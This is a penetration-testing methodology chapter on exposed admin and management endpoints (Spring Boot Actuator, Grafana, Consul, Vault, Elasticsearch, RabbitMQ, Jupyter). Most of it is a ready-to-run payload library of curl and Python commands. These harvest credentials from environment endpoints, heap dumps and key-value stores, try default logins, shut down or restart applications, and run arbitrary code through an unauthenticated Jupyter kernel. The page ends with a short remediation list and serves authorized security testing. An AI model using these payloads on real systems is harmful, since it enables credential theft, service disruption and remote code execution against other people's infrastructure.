---
title: "Exposed Admin Interfaces & Management Endpoints"
date: 2026-02-24
draft: false
---

# Exposed Admin Interfaces & Management Endpoints

> **Severity**: Critical | **CWE**: CWE-200, CWE-284
> **OWASP**: A05:2021 – Security Misconfiguration | A01:2021 – Broken Access Control

---

## What Is the Target?

Admin interfaces are management endpoints that expose high-privilege operations: Spring Boot Actuator (environment variables, heap dumps, thread dumps, HTTP trace logs, bean definitions), Prometheus metrics (may include secrets in metric labels), Grafana (dashboards + data source credential access), Kibana (full Elasticsearch access), Consul (service mesh + secrets), Vault (if UI exposed), Jupyter (code execution), Jenkins (pipeline execution), and custom admin panels.

These are dangerous because they're often deployed with the expectation they're "internal only" — but end up exposed to the internet or accessible to lower-privileged users.

---

## Discovery Checklist

**Phase 1 — Enumerate Exposed Endpoints**
- [ ] Scan standard management ports: 8080, 8443, 9090, 3000, 5601, 8500, 8200, 4646, 9200, 9300, 15672, 5672, 8888
- [ ] Fuzz common admin paths on the main application port
- [ ] Check Shodan/Censys for management endpoints on target IP ranges
- [ ] Look for `actuator`, `metrics`, `health`, `status`, `info` paths
- [ ] Check alternate subdomains: `admin.`, `manage.`, `internal.`, `ops.`, `monitoring.`

**Phase 2 — Access Control Testing**
- [ ] Test unauthenticated access: no credentials required?
- [ ] Test with application user credentials: does regular user token work?
- [ ] Test with default credentials (see Chapter 71)
- [ ] Check if admin interface is on a different port but same host — port whitelisting may differ

**Phase 3 — Exploit Exposed Functionality**
- [ ] Extract credentials from environment variables (Actuator `/env`, Consul KV)
- [ ] Download heap/thread dumps for offline credential extraction
- [ ] Read application configuration files via file disclosure
- [ ] Execute code via Actuator restartEndpoint, Jupyter, or Jenkins

---

## Payload Library

### Payload 1 — Spring Boot Actuator Full Exploitation

```bash
# Discovery: find Actuator endpoints
for path in actuator actuator/health actuator/info actuator/env \
  actuator/beans actuator/configprops actuator/mappings \
  actuator/metrics actuator/logfile actuator/threaddump \
  actuator/heapdump actuator/httptrace actuator/sessions \
  actuator/scheduledtasks actuator/flyway actuator/liquibase \
  actuator/loggers actuator/refresh actuator/restart \
  actuator/shutdown manage manage/health manage/env; do
  status=$(curl -s -o /tmp/act -w "%{http_code}" "https://target.com/$path")
  size=$(wc -c < /tmp/act)
  [ "$status" != "404" ] && echo "[$status, ${size}B] /$path"
done

# Extract all environment variables (credentials often here):
curl -s "https://target.com/actuator/env" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for prop_src in data.get('propertySources', []):
    for key, val in prop_src.get('properties', {}).items():
        v = val.get('value', '')
        # Look for credentials:
        if any(k in key.lower() for k in ['pass', 'secret', 'key', 'token', 'cred', 'jdbc']):
            print(f'  [CRED] {key}: {v}')
        elif v != '******':  # unmasked value
            print(f'  {key}: {str(v)[:100]}')
" 2>/dev/null

# Or dump all env in one shot:
curl -s "https://target.com/actuator/env" | \
  python3 -m json.tool | \
  grep -B1 -A1 '"value"' | \
  grep -v '\*\*\*\*\*\*' | head -100

# Extract specific sensitive properties:
curl -s "https://target.com/actuator/env/spring.datasource.password"
curl -s "https://target.com/actuator/env/spring.security.oauth2.client.registration"
curl -s "https://target.com/actuator/env/aws.secretKey"
curl -s "https://target.com/actuator/env/mail.password"

# Read application log file (may contain credentials, tokens):
curl -s "https://target.com/actuator/logfile" | grep -iE 'pass|secret|key|token|ERROR' | head -50

# HTTP trace — last 100 HTTP requests/responses (may contain auth headers):
curl -s "https://target.com/actuator/httptrace" | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for trace in data.get('traces', []):
    req = trace.get('request', {})
    headers = req.get('headers', {})
    if 'authorization' in {k.lower(): v for k, v in headers.items()}:
        print('AUTH HEADER IN TRACE:')
        for k, v in headers.items():
            if 'auth' in k.lower():
                print(f'  {k}: {v}')
"

# Download heap dump (Java heap = all objects in memory including credentials):
curl -s "https://target.com/actuator/heapdump" -o /tmp/heap.hprof
# Analyze with jhat, Eclipse MAT, or:
strings /tmp/heap.hprof | grep -iE 'password|secret|token|api_key' | sort -u | head -50

# Beans endpoint — full application context (shows dependencies, configs):
curl -s "https://target.com/actuator/beans" | python3 -m json.tool | grep -i "dataSource\|jdbc\|redis\|rabbit" | head -30

# Shutdown actuator (DoS — only in authorized tests):
curl -X POST "https://target.com/actuator/shutdown"

# Restart application (may reset state, clears sessions):
curl -X POST "https://target.com/actuator/restart"

# Change log level to DEBUG (enables verbose logging including credentials):
curl -X POST "https://target.com/actuator/loggers/ROOT" \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel":"DEBUG"}'
```

### Payload 2 — Prometheus / Grafana Exploitation

```bash
# Prometheus (port 9090) — metric and target discovery:
# List all metrics:
curl -s "http://TARGET:9090/api/v1/label/__name__/values" | python3 -m json.tool | head -50

# Query all metric targets (shows internal service URLs, IPs, ports):
curl -s "http://TARGET:9090/api/v1/targets" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for target in data.get('data', {}).get('activeTargets', []):
    print('URL:', target.get('scrapeUrl', ''))
    print('Labels:', target.get('labels', {}))
    print('---')
"

# Look for credentials in metric labels:
curl -s "http://TARGET:9090/api/v1/series?match[]={job=~\".+\"}" | \
  python3 -m json.tool | grep -iE 'pass|secret|key|token|cred' | head -20

# Query specific metrics for sensitive data:
for metric in "spring_datasource_url" "redis_url" "db_url" "kafka_url"; do
  curl -s "http://TARGET:9090/api/v1/query?query=$metric"
done

# Export all current metric values:
curl -s "http://TARGET:9090/metrics" | grep -E "^[a-z]" | head -50

# Grafana (port 3000) — if admin credentials work or default:
# Login attempt (default: admin/admin):
curl -s -X POST "http://TARGET:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"admin"}'

# If logged in — list data sources (contain database credentials!):
curl -s -H "Authorization: Basic $(echo -n admin:admin | base64)" \
  "http://TARGET:3000/api/datasources" | python3 -m json.tool

# Get data source credentials:
curl -s -H "Authorization: Basic $(echo -n admin:admin | base64)" \
  "http://TARGET:3000/api/datasources/1" | python3 -m json.tool | \
  grep -iE 'url|user|password|database'

# Export all dashboards:
curl -s -H "Authorization: Basic $(echo -n admin:admin | base64)" \
  "http://TARGET:3000/api/search?type=dash-db" | python3 -c "
import sys, json
for dash in json.load(sys.stdin):
    print(dash.get('uid'), dash.get('title'))
"
```

### Payload 3 — Consul & Vault Exploitation

```bash
# Consul (port 8500) — service mesh + KV store:
# List all keys (may contain secrets, configs):
curl -s "http://TARGET:8500/v1/kv/?recurse" | python3 -c "
import sys, json, base64
for item in json.load(sys.stdin):
    key = item['Key']
    val = base64.b64decode(item.get('Value') or '').decode(errors='replace')
    if any(k in key.lower() or k in val.lower()
           for k in ['pass', 'secret', 'key', 'token']):
        print(f'[CRED] {key}: {val[:100]}')
    else:
        print(f'{key}: {val[:50]}')
"

# List all services:
curl -s "http://TARGET:8500/v1/catalog/services" | python3 -m json.tool

# Get service health (shows internal IPs and ports):
curl -s "http://TARGET:8500/v1/health/state/any" | python3 -c "
import sys, json
for item in json.load(sys.stdin):
    print(f\"{item.get('ServiceName')}: {item.get('ServiceAddress')}:{item.get('ServicePort')}\")
"

# Consul ACL token listing (if ACL not enabled):
curl -s "http://TARGET:8500/v1/acl/tokens"

# Vault (port 8200) — secrets manager:
# Check if UI is exposed:
curl -s "http://TARGET:8200/v1/sys/health" | python3 -m json.tool

# List auth methods:
curl -s "http://TARGET:8200/v1/sys/auth" -H "X-Vault-Token: ROOT_TOKEN_IF_KNOWN"

# List secrets engines:
curl -s "http://TARGET:8200/v1/sys/mounts" -H "X-Vault-Token: TOKEN"

# If Vault token leaked (check environment, logs, source):
VAULT_TOKEN="s.XXXXXXXXXXXXXXXXXXXXXXXX"
curl -s -H "X-Vault-Token: $VAULT_TOKEN" "http://TARGET:8200/v1/secret/data/prod/db"

# List all paths:
curl -s -H "X-Vault-Token: $VAULT_TOKEN" \
  "http://TARGET:8200/v1/secret/metadata/?list=true"
```

### Payload 4 — Kibana / Elasticsearch Exploitation

```bash
# Elasticsearch (port 9200) — unauthenticated (common in older deployments):
# Cluster info:
curl -s "http://TARGET:9200/"
curl -s "http://TARGET:9200/_cluster/health?pretty"

# List all indices:
curl -s "http://TARGET:9200/_cat/indices?v"

# Read all documents from an index:
curl -s "http://TARGET:9200/INDEX_NAME/_search?size=100&pretty"

# Search across all indices for credentials:
curl -s -X POST "http://TARGET:9200/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "multi_match": {
        "query": "password",
        "fields": ["*"]
      }
    },
    "size": 10
  }'

# Dump entire index:
curl -s "http://TARGET:9200/users/_search?size=10000&scroll=1m" | \
  python3 -m json.tool | grep -E '"email"|"password"|"username"' | head -50

# Kibana (port 5601) — if unauthenticated or default creds:
# Check version and auth:
curl -s "http://TARGET:5601/api/status" | python3 -m json.tool | grep -i "version\|status"

# List saved objects (dashboards, index patterns, visualizations):
curl -s "http://TARGET:5601/api/saved_objects/_find?type=index-pattern&per_page=100" \
  | python3 -m json.tool

# RabbitMQ management interface (port 15672, default: guest/guest):
curl -s -u guest:guest "http://TARGET:15672/api/overview" | python3 -m json.tool | \
  grep -i "product\|version\|cluster"
curl -s -u guest:guest "http://TARGET:15672/api/queues" | python3 -m json.tool | head -50
curl -s -u guest:guest "http://TARGET:15672/api/connections" | python3 -m json.tool
```

### Payload 5 — Jupyter Notebook Code Execution

```bash
# Jupyter (port 8888) — if accessible without token or with known token:
# Check if token required:
curl -s "http://TARGET:8888/api/kernels" -o /dev/null -w "%{http_code}"
# 200 = no auth; 403 = token required

# If running without authentication:
# List running kernels:
curl -s "http://TARGET:8888/api/kernels" | python3 -m json.tool

# Create new Python kernel:
KERNEL_ID=$(curl -s -X POST "http://TARGET:8888/api/kernels" \
  -H "Content-Type: application/json" \
  -d '{"name":"python3"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
echo "Kernel: $KERNEL_ID"

# Execute arbitrary code via WebSocket:
python3 << 'EOF'
import websocket, json, uuid, sys

KERNEL_ID = "YOUR_KERNEL_ID"
WS_URL = f"ws://TARGET:8888/api/kernels/{KERNEL_ID}/channels"

ws = websocket.create_connection(WS_URL)

msg_id = str(uuid.uuid4())
execute_msg = {
    "header": {"msg_id": msg_id, "username": "attacker",
                "session": str(uuid.uuid4()), "msg_type": "execute_request",
                "version": "5.3"},
    "parent_header": {},
    "metadata": {},
    "content": {
        "code": "import subprocess; print(subprocess.check_output(['id']).decode())",
        "silent": False
    }
}

ws.send(json.dumps(execute_msg))

# Read responses:
for _ in range(10):
    msg = json.loads(ws.recv())
    if msg.get('msg_type') == 'execute_result':
        print("Result:", msg['content']['data']['text/plain'])
    elif msg.get('msg_type') == 'stream':
        print("Output:", msg['content']['text'])
    if msg.get('parent_header', {}).get('msg_id') == msg_id and \
       msg.get('msg_type') == 'status' and \
       msg.get('content', {}).get('execution_state') == 'idle':
        break
ws.close()
EOF
```

---

## Tools

```bash
# nuclei — automated management interface detection:
nuclei -target https://target.com -t technologies/ -t exposures/ \
  -t default-logins/ -t misconfiguration/

# Specific templates for management interfaces:
nuclei -target https://target.com \
  -t exposures/apis/spring-boot-actuator.yaml \
  -t exposures/apis/prometheus-metrics.yaml \
  -t default-logins/grafana/ \
  -t default-logins/kibana/ \
  -t default-logins/rabbitmq/

# masscan + nmap for management port discovery:
masscan -p8080,8443,9090,3000,5601,8500,8200,4646,9200,15672,8888,10250 \
  TARGET_IP_RANGE --rate=1000 -oJ management_ports.json

# nmap service detection on discovered ports:
nmap -sV -sC -p8080,8443,9090,3000,5601,8500,8200 TARGET_IP

# ffuf — admin path discovery on main app port:
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,401,403 \
  -fc 404

# Shodan for exposed management interfaces:
shodan search "product:Grafana port:3000"
shodan search "Kibana 5601"
shodan search "Spring Boot Actuator"
shodan search "Prometheus port:9090"
shodan search "Jupyter Notebook port:8888"

# dirsearch — comprehensive admin path fuzzing:
dirsearch -u https://target.com \
  -e php,html,js,json \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  --filter-status 404 -x 302
```

---

## Remediation Reference

- **Network-level access control**: management interfaces should only be accessible from specific IP ranges — use firewall rules, not just application-level authentication
- **Actuator endpoint restrictions**: expose only `health` and `info` publicly; require authentication for all others — configure `management.endpoints.web.exposure.include=health,info`
- **Disable unused endpoints**: shut down or explicitly disable any management endpoint not required for operation — `actuator.shutdown.enabled=false`
- **Authentication on all admin interfaces**: Grafana, Kibana, Consul, Vault, Jupyter, RabbitMQ — no default or no credentials is never acceptable in production
- **TLS everywhere**: management interfaces should use HTTPS — credentials and metrics traversing plaintext HTTP are trivially intercepted
- **Secret masking in Actuator**: Spring Boot masks common properties, but custom properties must be explicitly masked — configure `management.endpoint.env.keys-to-sanitize`
- **Separate management network**: deploy management interfaces on a dedicated interface/VLAN inaccessible from the application network or internet

*Part of the Web Application Penetration Testing Methodology series.*
